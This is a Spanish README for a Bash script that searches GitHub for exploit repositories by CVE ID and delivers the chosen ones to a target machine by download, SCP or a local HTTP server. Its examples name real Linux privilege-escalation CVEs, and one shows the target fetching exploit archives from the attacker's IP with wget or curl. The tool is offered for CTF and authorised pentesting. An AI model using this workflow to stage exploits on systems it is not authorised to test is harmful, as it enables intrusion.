<div align="center">

<img src="https://img.shields.io/badge/bash-5.0%2B-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white"/>
<img src="https://img.shields.io/badge/plataforma-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black"/>
<img src="https://img.shields.io/badge/GitHub_API-v3-181717?style=for-the-badge&logo=github&logoColor=white"/>
<img src="https://img.shields.io/badge/uso-CTF%20%2F%20PenTest-red?style=for-the-badge&logo=hackthebox&logoColor=white"/>

<br/><br/>

```
  ██████╗██╗   ██╗███████╗    ███████╗███████╗ █████╗ ██████╗  ██████╗██╗  ██╗███████╗██████╗
 ██╔════╝██║   ██║██╔════╝    ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
 ██║     ██║   ██║█████╗      ███████╗█████╗  ███████║██████╔╝██║     ███████║█████╗  ██████╔╝
 ██║     ╚██╗ ██╔╝██╔══╝      ╚════██║██╔══╝  ██╔══██║██╔══██╗██║     ██╔══██║██╔══╝  ██╔══██╗
 ╚██████╗ ╚████╔╝ ███████╗    ███████║███████╗██║  ██║██║  ██║╚██████╗██║  ██║███████╗██║  ██║
  ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
```

### *Buscador de exploits CVE en GitHub para CTF y Pentesting*

---

🇬🇧 [English](./README.md) · 🇪🇸 Español

</div>

---

## 📖 ¿Qué es esto?

**GitHubSearchCVE** es un script en Bash diseñado para jugadores de CTF y pentesters. Dado un identificador CVE, consulta la API de GitHub, presenta una **lista interactiva de repositorios** ordenados por estrellas, y te permite elegir qué exploits descargar — entregándolos mediante descarga directa, transferencia SCP a la máquina objetivo, o un servidor HTTP instantáneo con Python.

---

## ✨ Características

| Función | Descripción |
|---|---|
| 🔍 **Búsqueda inteligente** | Consulta la API v3 de GitHub filtrada por CVE e idioma |
| ⭐ **Ordenado por estrellas** | Resultados ordenados por confianza de la comunidad |
| 🖥️ **Selector interactivo** | Elige exactamente qué repositorios descargar |
| 📦 **Archivado automático** | Clona y empaqueta los repos como `.tar.gz` |
| 📡 **3 modos de entrega** | `Download`, `SCP` o servidor `HTTP` instantáneo |
| 🐍 **Servidor HTTP con Python** | Portable y sin los problemas de `nc` |
| 🔑 **Soporte de token GitHub** | Evita el rate limiting (10 → 5000 req/min) |
| 📝 **Log de sesión** | Log con timestamp guardado junto a las descargas |
| 🛡️ **Validación de entrada** | Verificación del formato CVE y gestión de errores de API |

---

## ⚙️ Requisitos

```bash
git · curl · jq · python3
```

En Debian/Ubuntu, instala todo de una vez con `-z on` (requiere root):

```bash
sudo ./GitHubSearchCVE.sh -z on -e CVE-2021-3156 -l Python -m Download
```

---

## 🚀 Uso

```bash
./GitHubSearchCVE.sh -e <CVE> -l <Lenguaje> -m <Modo> [opciones]
```

### Opciones

| Flag | Descripción | Requerido |
|------|-------------|-----------|
| `-e` | Identificador CVE — formato: `CVE-AÑO-CÓDIGO` | ✅ Sí |
| `-l` | Filtro de lenguaje: `Python`, `Shell`, `C`, `Go`, `Java`, `PHP`… | ✅ Sí |
| `-m` | Modo de entrega: `Download`, `SCP`, `HTTP` | ✅ Sí |
| `-n` | Máximo de resultados a obtener (1–10, por defecto: 10) | ❌ Opcional |
| `-u` | Usuario SSH para el modo SCP | Solo SCP |
| `-t` | IP/host objetivo para el modo SCP | Solo SCP |
| `-z` | Verificar dependencias — usa `-z on` para instalar automáticamente | ❌ Opcional |
| `-h` | Mostrar ayuda | ❌ Opcional |

> 💡 **Tip:** Define la variable de entorno `GITHUB_TOKEN` para evitar el límite de 10 peticiones/min de la API.

---

## 📋 Ejemplos

### Modo Download — guardar exploits en local
```bash
./GitHubSearchCVE.sh -e CVE-2021-3156 -l Python -m Download
```

### Modo HTTP — servir exploits a la máquina objetivo
```bash
./GitHubSearchCVE.sh -e CVE-2021-4034 -l C -m HTTP -n 5
```
Luego en la máquina objetivo:
```bash
wget http://<tu-ip>:8080/<exploit>.tar.gz
# o
curl -O http://<tu-ip>:8080/<exploit>.tar.gz
```

### Modo SCP — enviar directamente al objetivo
```bash
./GitHubSearchCVE.sh -e CVE-2023-0386 -l C -m SCP -u kali -t 10.10.10.25
```

### Con token de GitHub (recomendado)
```bash
export GITHUB_TOKEN="ghp_tuTokenAqui"
./GitHubSearchCVE.sh -e CVE-2022-0847 -l C -m Download
```

---

## 🔄 Flujo de trabajo

```
┌──────────────┐    ┌─────────────────┐    ┌──────────────────────┐
│  Ejecutas el │    │  API GitHub v3  │    │  Lista interactiva   │
│  script con  │───▶│  devuelve repos │───▶│  ordenada por ⭐     │
│  CVE + flags │    │  filtrados por  │    │  con metadatos       │
└──────────────┘    │  lenguaje       │    └──────────┬───────────┘
                    └─────────────────┘               │
                                                       ▼
                    ┌─────────────────┐    ┌──────────────────────┐
                    │  Entregado via  │    │  Eliges qué repos    │
                    │  Download / SCP │◀───│  clonar y archivar   │
                    │  / Servidor HTTP│    │  como .tar.gz        │
                    └─────────────────┘    └──────────────────────┘
```

---

## 📂 Estructura de salida

```
/tmp/CVEDownloaded/
├── autor1.tar.gz               ← repo clonado y archivado
├── autor2.tar.gz
└── session_20240315_1432.log   ← log de sesión con timestamp
```

---

## ⚠️ Aviso legal

> Esta herramienta está destinada **exclusivamente para investigación de seguridad legal**, competiciones CTF y pruebas de penetración autorizadas. El autor no se hace responsable de ningún uso indebido. Obtén siempre la autorización adecuada antes de realizar pruebas en sistemas que no sean de tu propiedad.

---

<div align="center">

Hecho con 🖤 para la comunidad de CTF y seguridad

</div>
